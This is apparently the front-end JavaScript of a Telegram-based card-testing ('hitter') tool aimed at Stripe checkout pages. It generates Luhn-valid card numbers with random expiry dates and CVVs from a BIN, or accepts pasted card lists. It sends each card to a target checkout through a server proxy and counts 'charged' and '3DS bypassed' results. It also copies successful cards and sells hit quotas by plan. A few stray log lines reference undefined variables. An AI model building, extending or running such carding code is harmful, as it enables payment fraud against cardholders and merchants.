// Telegram WebApp Initialization
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.expand();
    tg.ready();
    tg.MainButton.hide();
}

// State
let activeGate = 'checkout';
let activeMode = 'cards';
let isHitting = false;
let currentOtp = null;
let currentChatId = null;
let analyzedData = { site: null, amount: null };

// (Removed redundant API configs - handled by server proxy)

let userPlan = 'free';
let remainingHits = 0;
let maxHits = 2;

// Authentication Check
async function checkAuth() {
    // Auto-fill Chat ID from Telegram WebApp if available
    if (tg?.initDataUnsafe?.user?.id) {
        const loginChatIdInput = document.getElementById('loginChatId');
        if (loginChatIdInput && !loginChatIdInput.value) {
            loginChatIdInput.value = tg.initDataUnsafe.user.id;
        }
    }

    if (localStorage.getItem('isLoggedIn') === 'true') {
        const chatId = localStorage.getItem('userChatId');
        currentChatId = chatId;
        
        try {
            // Capture referral ID from Telegram start_param
            const referrerId = tg?.initDataUnsafe?.start_param || null;

            // Sync User Info from Server
            const res = await fetch('/get-user-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chatId, referrerId })
            });
            const data = await res.json();
            
            // Redirect if not verified
            if (data.isVerified === false) {
                window.location.href = '/';
                return;
            }

            userPlan = data.plan;
            remainingHits = data.plan === 'free' ? (data.maxHits - data.hitsToday) : 'Unlimited';
            maxHits = data.maxHits;

            document.getElementById('loginOverlay').classList.add('hidden');
            document.getElementById('app').classList.remove('blur');
            updateUIWithPlan();

            // Sync Telegram Profile in Tool Page
            if (tg?.initDataUnsafe?.user) {
                const user = tg.initDataUnsafe.user;
                const fullName = (user.first_name + ' ' + (user.last_name || '')).trim();
                document.getElementById('userName').innerText = fullName;
                document.getElementById('userChatIdDisplay').innerText = `ID: ${user.id}`;
                
                const picDiv = document.getElementById('userPic');
                if (user.photo_url) {
                    picDiv.innerHTML = `<img src="${user.photo_url}" style="width:100%;height:100%;border-radius:50%">`;
                } else {
                    console.log(`[Membership] User ${chatId} status in ${channel}: ${member.status}`);
                }
            }
        } catch (e) {
            console.error('Auth sync failed', e);
        }
    }
}
window.onload = checkAuth;

function updateUIWithPlan() {
    const statusText = document.getElementById('planStatusText');
    const badgeText = document.getElementById('headerPlanBadge');
    
    if (statusText) {
        statusText.innerText = `Plan: ${userPlan.toUpperCase()} | Hits Left: ${remainingHits}`;
    }
    if (badgeText) {
        badgeText.innerText = userPlan.toUpperCase();
    }
    
    // Update hit button if limit reached
    if (userPlan === 'free' && remainingHits <= 0) {
        document.getElementById('hitBtnText').innerText = 'Limit Reached - Upgrade';
    }
}

// Logout Logic
function logout() {
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('userChatId');
    location.reload();
}

// Send OTP via Server
document.getElementById('sendOtpBtn').addEventListener('click', async () => {
    const chatId = document.getElementById('loginChatId').value.trim();
    if (!chatId) { alert('Please enter your Chat ID'); return; }

    currentChatId = chatId;

    const btn = document.getElementById('sendOtpBtn');
    btn.disabled = true;
    btn.innerText = 'Sending...';

    try {
        const resp = await fetch('/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chatId })
        });

        const data = await resp.json();
        if (resp.ok) {
            document.getElementById('loginStep1').classList.add('hidden');
            document.getElementById('loginStep2').classList.remove('hidden');
            if (tg) tg.HapticFeedback.notificationOccurred('success');
        } else {
            alert(data.error || 'Failed to send OTP.');
        }
    } catch (err) {
        console.log(`[Membership] FULL REFRESH for User ID: ${chatId}. Checking Channels: ${CHANNELS.join(', ')}`);
    } finally {
        btn.disabled = false;
        btn.innerText = 'Send Verification Code';
    }
});

// Verify OTP via Server
document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
    const code = document.getElementById('loginCode').value.trim();
    const referrerId = tg?.initDataUnsafe?.start_param || null;

    if (!code) return alert('Enter the code');

    try {
        const response = await fetch('/verify-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chatId: currentChatId, code, referrerId })
        });
        
        const data = await response.json();
        if (response.ok) {
             // Final registration/sync
            await fetch('/get-user-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chatId: currentChatId, referrerId })
            });

            localStorage.setItem('isLoggedIn', 'true');
            localStorage.setItem('userChatId', currentChatId);
            
            document.getElementById('loginOverlay').classList.add('hidden');
            document.getElementById('app').classList.remove('blur');
            
            if (tg) {
                tg.HapticFeedback.notificationOccurred('success');
                tg.showPopup({ message: 'Login Successful!' });
            }
            checkAuth();
        } else {
            alert(data.error || 'Invalid Code');
        }
    } catch (err) {
        alert('Server connection lost');
    }
});

// DOM Elements
const gateTabs = document.querySelectorAll('.gate-tab');
const modeBtns = document.querySelectorAll('.mode-btn');
const cardsInputSection = document.getElementById('cardsInputSection');
const binInputSection = document.getElementById('binInputSection');
const hitBtn = document.getElementById('hitBtn');
const hitBtnText = document.getElementById('hitBtnText');
const resultsList = document.getElementById('resultsList');
const successCard = document.getElementById('successCard');

// Stats Elements
const statTotal = document.getElementById('statTotal');
const statCharged = document.getElementById('statCharged');
const statBypassed = document.getElementById('statBypassed');

// Link Preview Elements
const targetUrlInput = document.getElementById('targetUrl');
const linkPreview = document.getElementById('linkPreview');
const previewStatus = document.getElementById('previewStatus');
const previewData = document.getElementById('previewData');
const previewSiteName = document.getElementById('previewSiteName');
const previewAmount = document.getElementById('previewAmount');

let stats = { total: 0, charged: 0, bypassed: 0 };
let chargedCards = [];

// Tab Switching
gateTabs.forEach(tab => {
    tab.addEventListener('click', () => {
        gateTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        activeGate = tab.dataset.gate;
        if (tg) tg.HapticFeedback.selectionChanged();
    });
});

// Mode Switching
document.getElementById('modeCards').addEventListener('click', (e) => switchMode('cards', e.target));
document.getElementById('modeBin').addEventListener('click', (e) => switchMode('bin', e.target));

function switchMode(mode, btn) {
    activeMode = mode;
    modeBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    
    if (mode === 'cards') {
        cardsInputSection.classList.remove('hidden');
        binInputSection.classList.add('hidden');
    } else {
        cardsInputSection.classList.add('hidden');
        binInputSection.classList.remove('hidden');
    }
    if (tg) tg.HapticFeedback.selectionChanged();
}

// Analysis Logic
async function analyzeLink(url) {
    if (!url) {
        linkPreview.classList.add('hidden');
        return;
    }

    const isStripeURL = url.includes('stripe.com') || 
                       url.includes('/c/pay/') || 
                       url.includes('/billing/') || 
                       url.includes('/invoice/') || 
                       url.includes('/p/session/') ||
                       url.includes('/buy/');

    if (!isStripeURL) {
        linkPreview.classList.add('hidden');
        return;
    }

    linkPreview.classList.remove('hidden');
    previewStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing Link Details...';
    previewData.classList.add('hidden'); 
    
    try {
        const response = await fetch('/analyze-link', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url })
        });

        if (response.ok) {
            const data = await response.json();
            analyzedData = data;
            
            previewStatus.innerHTML = '✅ <span style="color: #10b981;">Analysis Complete</span>';
            previewSiteName.innerText = data.site || 'Stripe Page';
            previewAmount.innerText = data.amount || 'Unknown';
            previewData.classList.remove('hidden');
        } else {
            const err = await response.json().catch(() => ({}));
            previewStatus.innerHTML = `⚠️ Analysis Blocked (${err.error || 'Check URL'})`;
            previewSiteName.innerText = 'Click to Edit Site';
            previewAmount.innerText = 'Click to Edit Amt';
            previewData.classList.remove('hidden');
        }
    } catch (err) {
        previewStatus.innerHTML = '❌ Connection Error (Using Default)';
        previewSiteName.innerText = 'Stripe Checkout';
        previewAmount.innerText = 'Unknown';
        previewData.classList.remove('hidden');
    }
}

const handleUrlChange = (e) => {
    const url = (e.type === 'paste' ? e.clipboardData.getData('text') : e.target.value).trim();
    clearTimeout(targetUrlInput.timeout);
    targetUrlInput.timeout = setTimeout(() => analyzeLink(url), 400); // Faster debounce
};

targetUrlInput.addEventListener('input', handleUrlChange);
targetUrlInput.addEventListener('paste', handleUrlChange);

// Manual Override Logic
previewSiteName.parentElement.onclick = () => {
    const newName = prompt('Enter Site Name:', previewSiteName.innerText);
    if (newName) {
        previewSiteName.innerText = newName;
        analyzedData.site = newName;
    }
};

previewAmount.parentElement.onclick = () => {
    const newAmount = prompt('Enter Amount (e.g. 20.00 USD):', previewAmount.innerText);
    if (newAmount) {
        previewAmount.innerText = newAmount;
        analyzedData.amount = newAmount;
    }
};

// BIN Generation Logic
function generateLuhnCheckDigit(number) {
    let sum = 0;
    let shouldDouble = true;
    for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (10 - (sum % 10)) % 10;
}

function generateCardsFromBin(bin, qty) {
    const cards = [];
    const cleanBin = bin.replace(/\D/g, '');
    
    // Detect Card Type Length
    // Amex (34, 37) = 15 digits
    // Others = 16 digits
    const isAmex = cleanBin.startsWith('34') || cleanBin.startsWith('37');
    const targetLength = isAmex ? 15 : 16;
    const baseLength = targetLength - 1;

    for (let i = 0; i < qty; i++) {
        let cardBase = cleanBin;
        while (cardBase.length < baseLength) {
            cardBase += Math.floor(Math.random() * 10);
        }
        // If the BIN is already longer than baseLength, truncate it to baseLength
        if (cardBase.length > baseLength) {
            cardBase = cardBase.substring(0, baseLength);
        }

        const checkDigit = generateLuhnCheckDigit(cardBase);
        const cardNum = cardBase + checkDigit;
        
        const mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
        const yy = Math.floor(Math.random() * (2031 - 2027) + 2027).toString().slice(-2);
        const cvv = isAmex 
            ? String(Math.floor(Math.random() * 9000) + 1000) 
            : String(Math.floor(Math.random() * 900) + 100);
        cards.push(`${cardNum}|${mm}|${yy}|${cvv}`);
    }
    return cards;
}

// Hitting Logic
hitBtn.addEventListener('click', async () => {
    // If already hitting, this button acts as 'STOP'
    if (isHitting) {
        isHitting = false;
        hitBtn.classList.remove('stop-btn');
        hitBtnText.innerText = 'Stopping...';
        return;
    }

    const url = document.getElementById('targetUrl').value.trim();
    if (!url) {
        alert('Please enter a target URL');
        return;
    }

    let cards = [];
    if (activeMode === 'cards') {
        const raw = document.getElementById('cardsTextarea').value.trim();
        cards = raw.split('\n').filter(c => c.trim().length > 0);
    } else {
        const bin = document.getElementById('binNumber').value.trim();
        const qty = parseInt(document.getElementById('binQuantity').value) || 10;
        if (!bin) { alert('Please enter a BIN'); return; }
        cards = generateCardsFromBin(bin, qty);
    }

    if (cards.length === 0) {
        alert('No cards to process');
        return;
    }

    // Start Process
    isHitting = true;
    hitBtn.classList.add('stop-btn');
    hitBtn.disabled = true; // Physical lock
    hitBtnText.innerText = 'STOP';
    resultsList.innerHTML = '';
    
    // Reset Stats
    stats = { total: 0, charged: 0, bypassed: 0 };
    chargedCards = []; // Important: Clear success list too
    updateStatsUI();
    successCard.classList.add('hidden');

    for (let i = 0; i < cards.length; i++) {
        // Break loop if STOP was clicked
        if (!isHitting) break;

        // Check Limit Again (Real-time)
        if (userPlan === 'free' && remainingHits <= 0) {
            showLimitModal('Daily limit reached! Please upgrade your plan.');
            break;
        }

        const card = cards[i];
        const startTime = Date.now();
        
        try {
            // PROXY HIT through our server
            const response = await fetch(`/hit-proxy/${activeGate}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chatId: currentChatId,
                    url: url,
                    card: card,
                    userName: document.getElementById('userName').innerText || 'User',
                    site: analyzedData.site,
                    amount: analyzedData.amount
                })
            });

            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const result = await response.json().catch(() => ({}));

            // ALWAYS update local hit count if returned from server
            if (userPlan === 'free' && result.remainingHits !== undefined) {
                remainingHits = result.remainingHits;
                updateUIWithPlan();
            }

            if (!response.ok) {
                if (response.status === 403) {
                    showLimitModal(result.message || 'Limit Reached');
                    isHitting = false;
                    break;
                }
                if (result.message && result.message.includes('checkout_not_active_session')) {
                    isHitting = false;
                    injectLog(card, 'error', `🔴 Session Expired / Inactive. Stopping...`, elapsed);
                    break;
                }
                injectLog(card, 'error', result.message || 'System Error', elapsed);
                continue;
            }

            processHitResult(card, result, elapsed, i + 1, cards.length);

            // STOP IMMEDIATELY if hit is successful
            const isSuccess = result.status === 'charged' || result.status === 'approved' || (result.message && result.message.toLowerCase().includes('checkout_succeeded_session'));
            if (isSuccess) {
                isHitting = false;
                break; 
            }
        } catch (err) {
            console.error(err);
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            injectLog(card, 'error', `Network/CORS Error: ${err.message}`, elapsed);
        }
    }

    isHitting = false;
    hitBtn.classList.remove('stop-btn');
    hitBtn.disabled = false; // Release lock
    hitBtnText.innerText = 'Start Hitting';
    if (tg && tg.HapticFeedback && stats.charged > 0) tg.HapticFeedback.notificationOccurred('success');
});

function processHitResult(card, res, elapsed, count, total) {
    const status = (res.status || 'dead').toLowerCase();
    
    // Improved message extraction
    let message = res.message || res.error;
    if (!message) {
        if (res.status && res.status !== 'unknown') {
            message = `Status: ${res.status}`;
        } else {
            // If even message is missing, show the raw body or a descriptive error
            message = res.raw ? `Raw Error: ${JSON.stringify(res.raw)}` : 'Connection error: Backend returned an empty result';
        }
    }
    
    stats.total++;
    
    const lowerMsg = (res.message || res.error || '').toLowerCase();
    const isSuccess = status === 'charged' || status === 'approved' || lowerMsg.includes('checkout_succeeded_session');
    
    if (isSuccess) {
        stats.charged++;
        chargedCards.push(card);
        showSuccessCard(card, res, count, total);
        if (tg) tg.HapticFeedback.notificationOccurred('success');
    } else if (status === '3ds_bypassed' || status === 'live') {
        const lowerMsg = (res.message || res.error || '').toLowerCase();
        if (!lowerMsg.includes('authentication required') && !lowerMsg.includes('challenge required')) {
            stats.bypassed++;
        }
    }

    injectLog(res.card || card, status, message, elapsed, res.bypassed_3ds);
    updateStatsUI();
}

function updateStatsUI() {
    statTotal.innerText = `${stats.total} total`;
    statCharged.innerText = `${stats.charged} Charged`;
    statBypassed.innerText = `${stats.bypassed} 3DS Bypassed`;
}

function showSuccessCard(card, res, count, total) {
    successCard.classList.remove('hidden');
    document.getElementById('successAmount').innerText = res.amount || analyzedData.amount || 'Unknown';
    document.getElementById('successSite').innerText = res.site || analyzedData.site || 'Stripe Checkout';
    document.getElementById('successCardNum').innerText = maskCard(res.card || card);
    document.getElementById('successAttempts').innerText = `${count} / ${total}`;
}

function maskCard(card) {
    // User requested full visibility: no masking
    return card;
}

function injectLog(card, status, message, elapsed, bypassed3ds = false) {
    let statusClass = 'decline';
    let cleanMessage = message || 'Unknown Error';
    const lowerMsg = cleanMessage.toLowerCase();

    if (status === 'charged' || status === 'approved' || lowerMsg.includes('checkout_succeeded_session')) {
        statusClass = 'success';
        cleanMessage = 'Charged Successfully';
    } else if (bypassed3ds || lowerMsg.includes('3ds bypassed')) {
        statusClass = 'bypassed';
        cleanMessage = '3DS Bypassed';
    } else if (lowerMsg.includes('3ds cancelled')) {
        statusClass = 'cancelled';
        cleanMessage = '3DS Cancelled';
    } else if (lowerMsg.includes('generic_decline')) {
        statusClass = 'warning';
        cleanMessage = 'Generic Declined';
    }
    
    const div = document.createElement('div');
    div.className = 'log-item';
    
    div.innerHTML = `
        <div class="log-main">
            <span class="log-card">${maskCard(card)}</span>
            <span class="log-time">${elapsed}s</span>
        </div>
        <div class="log-status ${statusClass}">
            ${status === 'charged' || status === 'approved' ? '<i class="fas fa-shield-check"></i> ' : ''}
            ${cleanMessage}
        </div>
    `;
    
    resultsList.prepend(div);
}

// --- BIN Management ---
const saveBinBtn = document.getElementById('saveBinBtn');
const savedBinsContainer = document.getElementById('savedBins');
const binNumberInput = document.getElementById('binNumber');

function loadSavedBins() {
    const saved = JSON.parse(localStorage.getItem('savedBins_hitter') || '[]');
    savedBinsContainer.innerHTML = '';
    
    if (saved.length === 0) {
        savedBinsContainer.innerHTML = '<span style="font-size:10px; color:#444;">No saved BINs</span>';
        return;
    }

    saved.forEach((item, index) => {
        const tag = document.createElement('div');
        tag.className = 'bin-tag';
        tag.innerHTML = `
            <i class="fas fa-bookmark"></i>
            <span>${item.name}</span>
            <span class="tag-bin">(${item.bin})</span>
        `;
        tag.onclick = () => {
            binNumberInput.value = item.bin;
            if (tg) tg.HapticFeedback.selectionChanged();
        };
        
        // Long press to delete (Mobile friendly)
        let timer;
        tag.ontouchstart = () => timer = setTimeout(() => deleteBin(index), 800);
        tag.ontouchend = () => clearTimeout(timer);
        tag.onmousedown = () => timer = setTimeout(() => deleteBin(index), 800);
        tag.onmouseup = () => clearTimeout(timer);

        savedBinsContainer.appendChild(tag);
    });
}

function saveBin() {
    const bin = binNumberInput.value.trim();
    if (!bin) { alert('Enter a BIN first!'); return; }
    
    const name = prompt('Enter a name for this BIN (e.g. US VISA):', 'New BIN');
    if (!name) return;

    const saved = JSON.parse(localStorage.getItem('savedBins_hitter') || '[]');
    saved.push({ name, bin });
    localStorage.setItem('savedBins_hitter', JSON.stringify(saved));
    
    loadSavedBins();
    if (tg) tg.HapticFeedback.notificationOccurred('success');
}

function deleteBin(index) {
    if (!confirm('Delete this saved BIN?')) return;
    const saved = JSON.parse(localStorage.getItem('savedBins_hitter') || '[]');
    saved.splice(index, 1);
    localStorage.setItem('savedBins_hitter', JSON.stringify(saved));
    loadSavedBins();
}

if (saveBinBtn) {
    saveBinBtn.addEventListener('click', saveBin);
}

// Initial load
loadSavedBins();

function showLimitModal(msg) {
    const modal = document.getElementById('limitModal');
    const msgEl = document.getElementById('limitModalMsg');
    if (modal && msgEl) {
        msgEl.innerText = msg || 'You have used your free hits for today.';
        modal.classList.remove('hidden');
    } else {
        alert(msg || 'Limit Reached'); // Fallback if modal missing
    }
}


// Copy Charged
document.getElementById('copyBtn').addEventListener('click', () => {
    if (chargedCards.length === 0) return;
    const text = chargedCards.join('\n');
    navigator.clipboard.writeText(text).then(() => {
        alert('Charged cards copied to clipboard!');
    });
});
